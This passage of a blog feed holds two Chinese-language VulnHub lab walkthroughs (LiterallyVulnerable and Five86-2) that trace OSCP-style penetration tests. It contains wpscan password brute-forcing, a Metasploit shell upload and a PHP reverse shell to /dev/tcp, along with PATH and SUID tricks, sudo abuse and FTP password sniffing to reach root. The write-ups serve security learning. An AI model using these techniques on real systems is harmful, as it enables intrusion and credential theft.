-<p><img src="2020-03-08-15-13-12%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08-15-13-12屏幕截图"> </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://172.16.252.131:65535/phpcms/ --enumerate</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[+] maybeadmin</span><br><span class="line">| Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line">[+] notadmin</span><br><span class="line">| Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure>
-
-<p>得到两个用户名，使用前面得到的几个密码枚举爆破，碰运气，得到一组用户名密码：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://172.16.252.131:65535/phpcms/ -U users.txt -P backupPasswords</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[i] Valid Combinations Found:</span><br><span class="line">| Username: maybeadmin, Password:<span class="variable">$EPid</span>%J2L9LufO5</span><br></pre></td></tr></table></figure>
-
-<p><img src="2020-03-08-16-25-38%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08-16-25-38屏幕截图"></p>
-<h3 id="登录-Wordpress-后台"><a href="#登录-Wordpress-后台" class="headerlink" title="登录 Wordpress 后台"></a>登录 Wordpress 后台</h3><p>都翻了一遍，得到一组用户名和密码：</p>
-<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">notadmin:Pa<span class="symbol">$</span><span class="symbol">$</span>w0rd13!&amp;</span><br></pre></td></tr></table></figure>
-
-<p><img src="2020-03-08-16-41-43%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08-16-41-43屏幕截图"> </p>
-<h2 id="登录系统-Getshell"><a href="#登录系统-Getshell" class="headerlink" title="登录系统(Getshell)"></a>登录系统(Getshell)</h2><p>利用 <code>MSF</code> 上传木马 getshell</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">exploit/unix/webapp/wp_admin_shell_upload</span><br></pre></td></tr></table></figure>
-
-<p><img src="2020-03-09-18-18-23%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-18-18-23屏幕截图"></p>
-<h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer : literallyvulnerable</span><br><span class="line">OS : Linux literallyvulnerable 4.15.0-88-generic <span class="comment">#88-Ubuntu SMP Tue Feb 11 20:11:34 UTC 2020 x86_64</span></span><br><span class="line">Meterpreter : php/linux</span><br><span class="line">meterpreter &gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">######## lsb_release #############</span></span><br><span class="line">www-data@literallyvulnerable:$ lsb_release -a lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description: Ubuntu 18.04.3 LTS</span><br><span class="line">Release: 18.04</span><br><span class="line">Codename: bionic</span><br><span class="line"></span><br><span class="line"><span class="comment">####### /etc/passwd #######</span></span><br><span class="line">doe:x:1001:1001:Doe,,,:/home/doe:/bin/bash </span><br><span class="line">john:x:1000:1000:,,,:/home/john:/bin/bash</span><br></pre></td></tr></table></figure>
-
-<p>寻找 SUID 程序，得到可疑文件：<code>itseasy</code> </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-
-<p><img src="2020-03-09-19-27-43%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-19-27-43屏幕截图"> </p>
-<h2 id="权限提升-User"><a href="#权限提升-User" class="headerlink" title="权限提升(User)"></a>权限提升(User)</h2><p>运行 <code>itseasy</code> 得到当前目录绝对路径，看过一篇通过操控 <code>PATH</code> 参数值进行提权；怀疑程序调用了 <code>pwd</code> 命令</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">cp /bin/bash /tmp/<span class="built_in">pwd</span>    <span class="comment"># or echo "/bin/bash" &gt; /tmp/pwd</span></span><br><span class="line">chmod 777 /tmp/<span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>
-
-<p>执行后，没有得到预期的结果</p>
-<p><code>objdump -d</code> 一下，看到个 <code>getenv</code> 函数，用来获取环境变量</p>
-<p>也就是可以通过改变环境变量的值来控制这个程序：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> PWD=\$\(/bin/bash\)</span><br></pre></td></tr></table></figure>
-
-<p><img src="2020-03-09-20-28-54%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-28-54屏幕截图"> </p>
-<p><img src="2020-03-09-19-42-16%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-19-42-16屏幕截图"></p>
-<p>然后输入命令没有回显了，直接 SSH ：kali 下生成 ssh 公钥上传到目标机</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/john/.ssh &amp;&amp; wget http://172.16.252.129:8848/autorized_keys</span><br></pre></td></tr></table></figure>
-
-<h3 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h3><p>HOME 目录下的到一个 base64加密的密码</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">am9objpZWlckczhZNDlJQiNaWko= </span><br><span class="line"><span class="built_in">echo</span><span class="string">"am9objpZWlckczhZNDlJQiNaWko="</span>| base64 -d </span><br><span class="line"></span><br><span class="line">john:YZW<span class="variable">$s8Y49IB</span><span class="comment">#ZZJ</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="2020-03-09-19-54-52%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-19-54-52屏幕截图"> </p>
-<p><img src="2020-03-09-20-02-37%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-02-37屏幕截图"> </p>
-<p><img src="2020-03-09-20-05-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-05-51屏幕截图"></p>
-<p>搜索 SUID 程序：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find/ -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudopasswd root</span><br><span class="line">Sorry, user john is not allowed to execute <span class="string">'/usr/bin/passwd root'</span> as root on literallyvulnerable.</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">Matching Defaults entries forjohn on literallyvulnerable:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/</span><br><span class="line">sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line">    User john may run the following commands on literallyvulnerable: </span><br><span class="line">        (root) /var/www/html/test.html</span><br></pre></td></tr></table></figure>
-
-<p>可以运行 <code>/var/www/html/test.html</code> </p>
-<h2 id="权限提升-root"><a href="#权限提升-root" class="headerlink" title="权限提升(root)"></a>权限提升(root)</h2><p><code>/var/www/html</code> 目录下没有 <code>test.html</code> 文件，且 <code>john</code> 没有 <code>html</code> 目录的写权限，那就切换回 <code>www-data</code> 用户创建文件</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"/bin/bash"</span> &gt; test.html</span><br><span class="line">chmod 777 test.html</span><br></pre></td></tr></table></figure>
-
-<p><code>sudo</code> 运行，提权成功</p>
-<p><img src="2020-03-09-20-19-09%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-19-09屏幕截图"></p>
-<p><img src="2020-03-09-20-21-25%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-21-25屏幕截图"> </p>
-<p><img src="2020-03-09-20-21-43%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-21-43屏幕截图"> </p>
-]]></content>
-      <categories>
-        <category>vulnhub</category>
-      </categories>
-      <tags>
-        <tag>vulnhub</tag>
-        <tag>OSCP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Five86-2</title>
-    <url>/2020/03/19/Five86-2/</url>
-    <content><![CDATA[<blockquote>
-<p>2020-02-26</p>
-</blockquote>
-<h2 id="情报收集"><a href="#情报收集" class="headerlink" title="情报收集"></a>情报收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">20/tcp closed ftp-data</span><br><span class="line">21/tcp open   ftp      ProFTPD 1.3.5e</span><br><span class="line">80/tcp open   http     Apache httpd 2.4.41 ((Ubuntu))</span><br></pre></td></tr></table></figure>
-
-<p>无 <code>ProFTPD 1.3.5e</code> 相关漏洞，无法匿名登录</p>
-<p>后台放置目录枚举，<code>WordPress</code> 站点 <code>wpscan</code> 扫描</p>
-<p><img src="2020-02-26-15-21-50%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-26-15-21-50屏幕截图"> <img src="2020-02-26-15-22-25%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-26-15-22-25屏幕截图"> </p>
-<p>逐一访问，无有价值信息，<code>wpscan</code> 枚举出了几个用户名：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">barney</span><br><span class="line">peter</span><br><span class="line">admin</span><br><span class="line">gillian</span><br><span class="line">stephen</span><br></pre></td></tr></table></figure>
-
-<p>尝试枚举爆破，枚举出两个密码：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://192.168.56.117 -U tmp/user.txt -P /usr/share/wordlists/rockyou.txt -t 30</span><br><span class="line"></span><br><span class="line"><span class="comment"># [SUCCESS] - barney / spooky1                                                                 </span></span><br><span class="line"><span class="comment"># [SUCCESS] - stephen / apollo1</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="2020-02-26-15-53-05%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-26-15-53-05屏幕截图"> </p>
-<p><img src="2020-02-26-16-37-11%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-26-16-37-11屏幕截图"> </p>
-<h2 id="撬开大门"><a href="#撬开大门" class="headerlink" title="撬开大门"></a>撬开大门</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">barney ： spooky1   </span><br><span class="line">stephen ： apollo1</span><br></pre></td></tr></table></figure>
-
-<p>两个账号均可登录后台，不过 <code>stephen</code> 无利用点</p>
-<p><code>barney</code> 登陆后，有三个插件，搜索相关漏洞，除第三个插件外，其他暂无价值：</p>
-<p>根据 <code>PoC</code> 说明，写出 <code>exp</code> ，上传后，本地端口监听，访问上传网址，得到 <code>shell</code>：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> exec(<span class="string">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.56.109/8848 0&gt;&amp;1'"</span>);</span><br></pre></td></tr></table></figure>
-
-<p>注意：用 <code>echo</code> 写入的时候注意引号的转义，写入后最好再查看一遍利用脚本的内容是否正确</p>
-<p><img src="2020-02-26-17-37-01%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-26-17-37-01屏幕截图"></p>
-<p><img src="2020-02-26-17-37-18%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-26-17-37-18屏幕截图"> <img src="2020-02-26-17-34-20%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="被忽略的转义"></p>
-<h2 id="登堂入室"><a href="#登堂入室" class="headerlink" title="登堂入室"></a>登堂入室</h2><p>接收到了 <code>shell</code> 先收集一波信息，最喜欢的 <code>/etc/passwd</code> 里总是包含用户及其主目录，<code>HOME</code> 下的用户目录无访问权限</p>
-<p>各种信息收集了一波，当前用户的作用实在不大。无思路无目的时候，就是收集的情报不够，整理一下现有资料：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT   STATE  SERVICE  VERSION</span><br><span class="line">20/tcp closed ftp-data</span><br><span class="line">21/tcp open   ftp      ProFTPD 1.3.5e					无相关漏洞</span><br><span class="line">80/tcp open   http     Apache httpd 2.4.41 ((Ubuntu))	无相关漏洞</span><br><span class="line"><span class="comment">#####################</span></span><br><span class="line">barney		spooky1		FTP：No	WordPress：OK</span><br><span class="line">peter</span><br><span class="line">admin</span><br><span class="line">gillian</span><br><span class="line">stephen		apollo1		FTP：No	WordPress：OK</span><br><span class="line"><span class="comment">######################</span></span><br><span class="line">barney		:x:1001:1001:Barney Sumner:/home/barney:/bin/bash</span><br><span class="line">stephen		:x:1002:1002:Stephen Morris:/home/stephen:/bin/bash</span><br><span class="line">peter		:x:1003:1003:Peter Hook:/home/peter:/bin/bash</span><br><span class="line">gillian		:x:1004:1004:Gillian Gilbert:/home/gillian:/bin/bash</span><br><span class="line">richard		:x:1005:1005:Richard Starkey:/home/richard:/bin/bash</span><br><span class="line">paul		:x:1006:1006:Paul McCartney:/home/paul:/bin/bash</span><br><span class="line">john		:x:1007:1007:John Lennon:/home/john:/bin/bash</span><br><span class="line">george		:x:1008:1008:George Harrison:/home/george:/bin/bash</span><br><span class="line"><span class="comment">#####################</span></span><br><span class="line">得到密码的两个账号无法登陆 FTP</span><br><span class="line"></span><br><span class="line"><span class="comment">#####################									&lt;----- 未验证/未收集</span></span><br><span class="line">Linux kernel 信息未收集（内核提权）</span><br><span class="line">FTP 没有起到作用（存在即有理）</span><br><span class="line"></span><br><span class="line"><span class="comment">####################</span></span><br><span class="line">两个账户存在于 /etc/passwd 下，是否可以切换用户</span><br><span class="line">barney 密码错误</span><br><span class="line">stephen 可以切换</span><br><span class="line"><span class="comment">####################</span></span><br><span class="line">barney		spooky1		FTP：No	WordPress：OK	su：NO</span><br><span class="line">peter</span><br><span class="line">admin</span><br><span class="line">gillian</span><br><span class="line">stephen		apollo1		FTP：No	WordPress：OK	su：OK	&lt;----- 切入点</span><br></pre></td></tr></table></figure>
-
-<p><img src="2020-02-26-17-38-13%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-26-17-38-13屏幕截图"></p>
-<h2 id="身份转换"><a href="#身份转换" class="headerlink" title="身份转换"></a>身份转换</h2><p><code>su stephen</code> ：切换用户</p>
-<p>不存在 <code>sudo</code> 权限，主目录暂无利用信息，卡住了</p>
-<p>查了一下 WriteUp，抓 <code>FTP</code> 的包，有明文密码：</p>
-<p>查看相关进程：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps -aux | grep <span class="string">"ftp"</span></span><br><span class="line"></span><br><span class="line">systemd+  1376  0.0  0.9 119972  9484 pts/0    Ss+  02:32   0:00 proftpd: (accepting connections)</span><br><span class="line">paul      2883  0.0  0.0   2600   732 ?        Ss   05:38   0:00 /bin/sh -c /home/paul/ftp_upload.sh &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">paul      2884  0.0  0.0   2600   864 ?        S    05:38   0:00 /bin/sh /home/paul/ftp_upload.sh</span><br><span class="line">paul      2885  0.0  0.2   3224  2036 ?        S    05:38   0:00 ftp -n 172.18.0.10</span><br><span class="line">1000      2886  0.0  0.8 133072  8136 pts/0    S+   05:38   0:00 proftpd: paul - 172.18.0.1: STOR file.txt</span><br><span class="line">stephen   2889  0.0  0.0   6296   924 pts/0    S+   05:38   0:00 grep ftp</span><br></pre></td></tr></table></figure>
-
-<p>查看 FTP 监听的网卡：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip addr</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">3: br-eca3858d86bf: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default </span><br><span class="line">    link/ether 02:42:9e:df:8d:0f brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-eca3858d86bf</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::42:9eff:fedf:8d0f/64 scope link</span><br></pre></td></tr></table></figure>
-
-<p>抓包，得到密码：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">timeout 50 tcpdump -i br-eca3858d86bf -w pack.pcap</span><br><span class="line">tcpdump -r pack.pcap</span><br></pre></td></tr></table></figure>
-
-<p><img src="2020-02-27-13-39-28%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-27 13-39-28屏幕截图"> </p>
-<p><img src="2020-02-27-14-40-50%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-27 14-40-50屏幕截图"> </p>
-<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>登录 <code>paul</code> 查看可以 <code>sudo</code> 执行的程序：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Matching Defaults entries <span class="keyword">for</span> paul on five86-2:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User paul may run the following commands on five86-2:</span><br><span class="line">    (peter) NOPASSWD: /usr/sbin/service</span><br></pre></td></tr></table></figure>
-
-<p><code>/usr/sbin/service</code> 提权：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u peter service ../../bin/bash</span><br></pre></td></tr></table></figure>
-
-<p>查看可以 <code>sudo</code> 执行的程序：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Matching Defaults entries <span class="keyword">for</span> peter on five86-2:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User peter may run the following commands on five86-2:</span><br><span class="line">    (ALL : ALL) ALL</span><br><span class="line">    (root) NOPASSWD: /usr/bin/passwd</span><br></pre></td></tr></table></figure>
-
-<p>修改 <code>root</code> 密码，登录 <code>root</code> 查看 <code>flag</code> ：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo passwd root</span><br><span class="line"></span><br><span class="line">su -</span><br></pre></td></tr></table></figure>
-
-<p><img src="2020-02-27-14-54-14%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-27 14-54-14屏幕截图"> </p>
-<hr>
-<p>卡在了 <code>FTP</code> 抓包的位置，还是经验不足</p>
-<p>前期收集的信息必定是有用的，<code>FTP</code> 使用明文传输密码，只需要抓包，就可以得到</p>
-<p>查看系统正在运行的进程也要加入信息收集里面</p>
 ]]></content>
       <categories>
         <category>vulnhub</category>
